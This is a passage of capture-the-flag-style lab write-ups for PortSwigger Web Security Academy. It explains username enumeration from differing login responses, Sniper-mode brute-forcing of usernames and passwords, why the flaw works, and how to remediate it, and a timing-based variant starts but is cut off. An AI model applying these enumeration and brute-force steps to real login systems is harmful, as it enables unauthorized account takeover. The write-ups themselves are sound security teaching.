Set a payload position on the username parameter only, load the candidate-username wordlist as a Sniper attack payload list, and keep the password fixed to any value. Start the attack.

Sort or scan the results for a response that differs from the rest — a different status code, response length, or body text (for example, an explicit "Invalid password" rather than "Invalid username or password"). That payload is the valid username.

docs.title: 3. Brute-force the password for that username
docs.text: Fix username to the value just discovered, move the payload position to password, and load the candidate-password wordlist for a new Sniper attack.

docs.title: 4. Identify the successful login
docs.text: A correct username/password pair normally returns a redirect (302) to the account page instead of the login page again, and its response length differs from every failed attempt.

docs.title: 5. Log in and solve the lab
docs.text: Submit the recovered username and password through the login form and open the account page to solve the lab.

docs.title: Why it works
docs.text: The application's error handling branches on whether the username exists before checking the password, and lets that branch leak into the response. Any observable difference between "unknown username" and "wrong password" — message text, status code, headers, or length — is enough to enumerate accounts one username at a time.

docs.title: Remediation
docs.text:
• Return an identical response (status code, headers, body, and timing) for every failed login, regardless of which part of the credential was wrong.
  • Rate-limit and lock out repeated failed attempts per account and per source to make brute-forcing impractical even without enumeration.
  • Avoid registration and password-reset flows that reveal whether a username or email is already registered.

docs.title: Username enumeration via response timing
docs.text:
Lab: PortSwigger Web Security Academy — Username enumeration via response timing (Practitioner).

This lab is vulnerable to username enumeration using its response times. To solve the lab, enumerate a valid username, brute-force this user's password, then access their account page.

No screenshots for this lab

The source notes for this lab recorded the objective and credentials but no walkthrough screenshots, so this page describes the technique and solution approach rather than reproducing a step-by-step image sequence. Credentials for the lab's own account: wiener:peter.

docs.title: BASICS: when even the text and status code are identical
docs.text:
